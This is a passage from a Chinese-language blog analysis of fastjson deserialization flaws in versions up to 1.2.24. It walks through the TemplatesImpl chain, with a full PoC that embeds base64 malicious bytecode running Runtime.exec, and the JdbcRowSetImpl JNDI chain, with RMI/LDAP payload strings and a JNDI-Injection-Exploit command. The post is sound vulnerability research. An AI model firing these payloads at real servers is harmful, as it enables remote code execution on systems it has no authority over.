function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        calc.setCalc(<span class="hljs-string">&quot;zjacky&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span> JSON.toJSONString(calc, SerializerFeature.WriteClassName); <span class="hljs-comment">//</span><br>        System.out.println(jsonstring);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//  &#123;&quot;@type&quot;:&quot;fastjson.Calc&quot;,&quot;calc&quot;:&quot;zjacky&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson_Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">JSON_Calc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Calc\&quot;,\&quot;calc\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(JSON_Calc));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130122.png" alt="image">​</p><p>成功执行了setter中的恶意代码。因此，只要我们能找到一个合适的Java Bean，其setter或getter存在可控参数，则有可能造成任意命令执行。</p><p>‍</p><p>总结出一句话就是 fastjson他反序列化的时候会去找到@type这个指定类的全部属性的seter geter方法来进行自动调用，也就是说如果存在一个可控的指定类，以及这个指定类中存在可控的set get方法，就可以通过这个fastjson去调用set方法去达到任意命令执行</p><p>‍</p><p>参考</p><p><a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E6%9C%AA%E8%AE%BE%E7%BD%AEFeature-SupportNonPublicField">https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E6%9C%AA%E8%AE%BE%E7%BD%AEFeature-SupportNonPublicField</a></p><p><a href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a></p><p>‍</p><p>‍</p><h2 id="Fastjson各版本漏洞绕过分析"><a href="#Fastjson各版本漏洞绕过分析" class="headerlink" title="Fastjson各版本漏洞绕过分析"></a>Fastjson各版本漏洞绕过分析</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h3><p>配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>    &lt;dependency&gt;<br>        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>        &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.23</span>&lt;/version&gt;<br>    &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure><p>在小于fastjson1.2.22-1.2.24版本中有两条利用链。</p><ol><li>JNDI <code>com.sun.rowset.JdbcRowSetImpl</code>​</li><li>JDK7u21 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>​</li></ol><h4 id="TemplatesImpl链-JDK7u21"><a href="#TemplatesImpl链-JDK7u21" class="headerlink" title="TemplatesImpl链(JDK7u21)"></a>TemplatesImpl链(JDK7u21)</h4><p>条件苛刻</p><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)</code>​</li><li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField)</code>​</li></ol><h5 id="漏洞静态分析"><a href="#漏洞静态分析" class="headerlink" title="漏洞静态分析"></a>漏洞静态分析</h5><p>后半条链子是(CC3)  JDK7u21 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>​</p><p><a href="https://blog.csdn.net/solitudi/article/details/119082164">https://blog.csdn.net/solitudi/article/details/119082164</a></p><p>首先参考Y4的博客了解到 defineClass的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span>&#123;<br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TouchFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>存在一个构造方法，构造方法中存在命令执行</p><p>把它编译成字节码后再base64运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL1Rlc3Q7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAGgwAGwAcAQAEY2FsYwwAHQAeAQAQb3JnL2V4YW1wbGUvVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAB0ABAAeAA0AHwALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQAAAAAgAR&quot;</span>);<br>Class yyds= (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Test&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>yyds.newInstance();<br></code></pre></td></tr></table></figure><p>确实是可以弹出计算机的 (这里有点问题 之后在解决)</p><p>‍</p><p>也就是说如果能找到defineClass方法并且参数可控，那么就可以造成RCE了，那么于是乎这条链子的作者在<code>rt.jar</code>​中找到了defineClass</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass()</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br></code></pre></td></tr></table></figure><p>但是在实际场景中，因为defineClass方法作用域却是不开放的(就是并不是public方法，所以需要找谁去调用了他)，所以我们很很难直接利用到它</p><p>所以我们要去找谁调用了这个<code>defineClass</code>​函数 ，于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses()</code>​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130293.png" alt="image">​</p><p>这里<code> _bytecodes</code>​ 不能为空</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130513.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130642.png" alt="image">​</p><p>‍</p><p>‍</p><p>这里会将我们的<code>_bytecodes</code>​加载进<code>_class</code>​这个当中，所以这里就要传我们的<code>_bytecodes</code>​</p><p>‍</p><p>在往上跟</p><p>于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance()</code>​</p><p>TemplatesImpl中<code>_bytecodes</code>​属性中存放着手工编写的字节码，并在其调用<code>getTransletInstance()</code>​方法时会加载该字节码到JVM中获取到字节码中的类并调用newInstance()创建该类的实例，如果<code>_bytecodes</code>​为可控的并且能找到一条触发getTransletInstance()方法的调用链，那么rce不就有了嘛。</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130772.png" alt="image">​</p><p>在这里 455 行里头会把_class进行实例化从而会执行这个实例化所调用的静态方法和构造方法</p><p>当看完上述代码 你是否存在以下几个疑问？</p><ol><li><code>_class</code>​  这玩意在451行的时候是为空才能进入，为啥后面455又有内容了呢？ -&gt;因为根本没传<code>_class</code>​ 而是在451行通过<code>_bytecodes</code>​进行传入的</li><li>455行会去进行强制类型转换为<code>AbstractTranslet</code>​类，那我们是不是要传该类进来呢？</li><li>我的<code>_name</code>​不能为空啊，不然的话就会返回null</li></ol><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130952.png" alt="image">​</p><p>‍</p><p>再往上跟</p><p>于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130075.png" alt="image">​</p><p>再继续往上跟就找到了</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130231.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130362.png" alt="image">​</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt;<br>TemplatesImpl#newTransformer() -&gt;<br>TemplatesImpl#getTransletInstance() -&gt;<br>TemplatesImpl#defineTransletClasses() -&gt;<br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>‍</p><p>这里其实还有一个疑问，那就是传入的get方法难道不是叫<code>get_outputProperties</code>​吗？</p><p>其实这里在fastjson中会有一个特殊的处理</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130531.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130753.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130941.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130090.png" alt="image">​</p><p>‍</p><p>整条TemplatesImpl链就跟完了</p><p>先贴出poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Main.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilCode_base64</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAJAoABwAWCgAXABgIABkKABcAGgcAGwoABQAWBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB0BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB4BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAMUGF5bG9hZC5qYXZhDAAIAAkHAB8MACAAIQEABGNhbGMMACIAIwEAE29yZy9leGFtcGxlL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAGQAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAHAAIAB0ADAAAAAQAAQANAAEAFAAAAAIAFQ==&quot;</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span>  <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br><br>        JSON.parse(payload, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Payload.java 把恶意类 将其编译为.class文件后进行base64编码即可</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Payload</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130208.png" alt="image">​</p><h5 id="小结一下-TemplatesImpl-链"><a href="#小结一下-TemplatesImpl-链" class="headerlink" title="小结一下 TemplatesImpl 链"></a>小结一下 TemplatesImpl 链</h5><p>其实就是在fastjson的反序列化当中在autotype开启下，去寻找了templateslmpl这条链子，这条链子的一些初始化属性的get方法可以拼接到后续的jdk7u21的后半段链子当中然后通过defineClass来加载的恶意字节码来达到RCE的效果</p><p>‍</p><p>动态分析一下 在这里打下断点<code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130372.png" alt="image">​</p><p>在153行的地方将<code>_bytecodes</code>​的内容作为参数 传入<code>parseArray()</code>​中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130824.png" alt="image">​</p><p>然后再这里调用了反序列化器进行反序列化</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130002.png" alt="image">​</p><p>然后就会走到这个逻辑</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130245.png" alt="image">​</p><p>重点就是这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = lexer.bytesValue();<br></code></pre></td></tr></table></figure><p>调用lexer.bytesValue获取bytes</p><p>这里对数据进行base64解码处理，将bytes数据返回。所以<code>_bytecodes</code>​需要进行base64编码。</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130480.png" alt="image">​</p><p>然后后续就是链子了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130607.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ul><li><a href="https://forum.butian.net/share/1092">https://forum.butian.net/share/1092</a></li><li><a href="https://www.cnblogs.com/akka1/p/16138460.html">https://www.cnblogs.com/akka1/p/16138460.html</a></li><li><a href="https://y4er.com/posts/fastjson-learn/">https://y4er.com/posts/fastjson-learn/</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/14601670.html#">https://www.cnblogs.com/nice0e3/p/14601670.html#</a></li></ul><p>‍</p><h4 id="JdbcRowSetImpl链-JNDI"><a href="#JdbcRowSetImpl链-JNDI" class="headerlink" title="JdbcRowSetImpl链(JNDI)"></a><span style="font-weight: bold;" data-type="strong">JdbcRowSetImpl链(JNDI)</span></h4><p>问题出在<code>JdbcRowSetImpl#setDataSourceName</code>​和<code>JdbcRowSetImpl#setAutoCommit</code>​方法中存在可控的参数</p><p>首先在<code>com.sun.rowset.JdbcRowSetImpl</code>​存在<code>setAutoCommit</code>​ 方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130731.png" alt="image">​</p><p>在this.conn为空的情况下会调用<code>this.connect();</code>​ 方法 跟进一下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130858.png" alt="image">​</p><p>这个的话很明显的一个lookup函数配合JNDI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InitialContext</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><span class="hljs-type">DataSource</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (DataSource)var1.lookup(<span class="hljs-built_in">this</span>.getDataSourceName());<br></code></pre></td></tr></table></figure><p>那只要保证<code>this.getDataSourceName() != null</code>​ 就可以触发这个JNDI了，所以建立一个小Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">JdbcRowSetImpl_inc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        JdbcRowSetImpl_inc.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/7nt2gi&quot;</span><br>        );<br>        JdbcRowSetImpl_inc.setAutoCommit(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130115.png" alt="image">​</p><p>这里的rmi是通过这个jndi利用工具起的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\Environment-Java\jdk1.8.0_65\bin\java.exe -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C <span class="hljs-string">&quot;calc&quot;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>另一个函数就是<code>setDataSourceName</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130374.png" alt="image">​</p><p>‍</p><p>他会调用父类的<code>setDataSourceName</code>​然后去设置<code>dataSource</code>​参数</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130514.png" alt="image">​</p><p>而lookup函数的参数其实就是datasource这个参数</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130637.png" alt="image">​</p><p>但其实都是有限制的</p><p>在以下三种反序列化中均可使用，JDK版本限制和JNDI类似</p><h5 id="RMI-JNDI"><a href="#RMI-JNDI" class="headerlink" title="RMI+JNDI"></a>RMI+JNDI</h5><p>JDK版本为<code>JDK8u_65</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson_Jdbc_RMI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/badClassName\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><h5 id="LDAP-JNDI"><a href="#LDAP-JNDI" class="headerlink" title="LDAP+JNDI"></a>LDAP+JNDI</h5><p>JDK版本为<code>JDK8u_181</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson_Jdbc_LDAP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span 